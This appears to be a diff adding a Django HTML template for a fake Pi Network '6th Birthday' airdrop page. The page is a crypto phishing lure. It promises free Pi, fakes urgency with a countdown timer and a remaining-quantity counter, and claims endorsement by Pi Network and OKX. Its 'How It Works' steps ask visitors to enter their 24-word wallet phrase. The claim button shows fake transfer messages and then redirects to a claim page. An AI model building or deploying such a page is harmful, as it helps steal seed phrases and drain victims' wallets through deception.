@@ -1,0 +1,173 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Pi Network 6th Birthday</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="{% static 'css/style.css' %}" />
+  </head>
+  <body>
+    <div class="wrapper">
+      <!-- Header -->
+      <div class="header">
+        <div class="wallet">
+          <img src="{% static 'images/ni.png' %}" alt="Pi" class="pi-logo" />
+          <span>Wallet</span>
+        </div>
+      </div>
+
+      <!-- Main Section -->
+      <div class="main-box">
+        <h3 class="airdrop-title">Pi Network Airdrop Program</h3>
+        <h1 class="main-title">Happy 6th Birthday</h1>
+        <p class="description">
+          🎁 Celebrating the 6th birthday and preparing for the Mainnet Mass phase. To thank the entire community, the Pi Network project team will randomly give away 20π - 200π to 6,000 wallets that have successfully KYC.
+        </p>
+
+        <h1 class="pi-value">+200 π</h1>
+
+        <ul class="info-list">
+          <li>
+            <span class="icon-line">
+              <img src="{% static 'images/si3.png' %}" class="inline-icon" />
+              Time Remaining: <span class="bold" id="countdown">18:15:00</span>
+            </span>
+          </li>
+          <li>
+            <span class="icon-line">
+              <img src="{% static 'images/si2.png' %}" class="inline-icon" />
+              Condition: KYC Successfully Passed
+            </span>
+          </li>
+          <li>
+            <span class="icon-line">
+              <img src="{% static 'images/si1.png' %}" class="inline-icon" />
+              Remaining Quantity: 3024 / 6000
+            </span>
+          </li>
+        </ul>
+
+        <a href="#" id="claimBtn" class="claim-button">CLAIM 200 PI NOW</a>
+      </div>
+
+      <!-- Features -->
+      <div class="features-grid">
+        <div class="feature-box">
+          <img src="{% static 'images/feature1.png' %}" alt="Birthday Icon" />
+          <br /><b>Birthday Program</b> 
+        </div>
+        <div class="feature-box">
+          <img src="{% static 'images/feature2.png' %}" alt="Clock Icon" />
+          <br /><b>Receive in 24h</b>
+        </div>
+        <div class="feature-box">
+          <img src="{% static 'images/feature3.png' %}" alt="Shield Icon" />
+          <br /><b>Safe & Secure</b>
+        </div>
+        <div class="feature-box">
+          <img src="{% static 'images/feature4.png' %}" alt="Participants Icon" />
+          <br /><b>500000+ Participants</b>
+        </div>
+      </div>
+
+      <!-- About Section -->
+      <div class="about-section">
+        <h2>About This Program</h2>
+        <img src="{% static 'images/bigcrop.png' %}" class="about-icon" />
+        <p>This reward program is an initiative by Picoreteam and sponsors to support Pi Network pioneers. As an independent promotion, we distribute a limited amount of Pi coins to active community members.</p>
+
+        <h2>How It Works</h2>
+        <div class="steps">
+          <div class="step">1<br />Click the "Get Pi Rewards Now" button above</div>
+          <div class="step">2<br />Enter your 24-word phrase to unlock and claim Pi rewards</div>
+          <div class="step">3<br />Submit your request for verification</div>
+          <div class="step">4<br />Receive Pi rewards within 24 hours</div>
+        </div>
+      
+
+      <div class="security-image-wrap">
+        <img src="{% static 'images/secshd.png' %}" alt="Verified Badge" />
+      </div>
+
+      <div class="security-box">
+        <h3>Security & Transparency</h3>
+        <p>This is an independent promotional campaign affiliated and verified by the official Pi Network.</p>
+      </div>
+</div>
+      <!-- Support Section -->
+      <div class="support-section">
+        <h2>Supported By</h2>
+        <div class="support-grid">
+          <div class="support-box">
+            <img src="{% static 'images/support2.png' %}" alt="TechFi Icon" />
+            <br />TechFi<br /><span>Technical support</span>
+          </div>
+          <div class="support-box">
+            <img src="{% static 'images/support4.png' %}" alt="OKX Icon" />
+            <br />OKX<br /><span>Blockchain partner</span>
+          </div>
+          <div class="support-box">
+            <img src="{% static 'images/support3.png' %}" alt="CryptoPlus Icon" />
+            <br />CryptoPlus<br /><span>Payment gateway</span>
+          </div>
+          <div class="support-box">
+            <img src="{% static 'images/support1.png' %}" alt="PiCommunity Icon" />
+            <br />PiCommunity<br /><span>Community support</span>
+          </div>
+        </div>
+        <p class="footer-text">© 2025 Pi Network Reward Program. All rights reserved.</p>
+      </div>
+    </div>
+<script>
+    
+  // Countdown Timer
+// Countdown Timer (starts from 18:15:00)
+let totalSeconds = 18 * 3600 + 15 * 60; // 65700 seconds
+const countdownEl = document.getElementById("countdown");
+
+const updateCountdown = () => {
+  const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
+  const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
+  const seconds = String(totalSeconds % 60).padStart(2, '0');
+
+  countdownEl.textContent = `${hours}:${minutes}:${seconds}`;
+  totalSeconds--;
+
+  if (totalSeconds >= 0) {
+    setTimeout(updateCountdown, 1000);
+  } else {
+    countdownEl.textContent = "00:00:00";
+  }
+};
+
+updateCountdown();
+
+
+
+
+      // Claim Button Progress
+      const btn = document.getElementById("claimBtn");
+btn.addEventListener("click", function (e) {
+  e.preventDefault();
+
+  let steps = ["Please wait...", "Connecting...", "Transferring Pi...", "Confirming wallet..."];
+  let index = 0;
+
+  btn.classList.add("fade");
+
+  const interval = setInterval(() => {
+    if (index < steps.length) {
+      btn.textContent = steps[index];
+      index++;
+    } else {
+      clearInterval(interval);
+      setTimeout(() => {
+        window.location.href = "{% url 'claim' %}";
+      }, 500);
+    }
+  }, 1000);
+});
+    </script>
+  </body>
+</html>
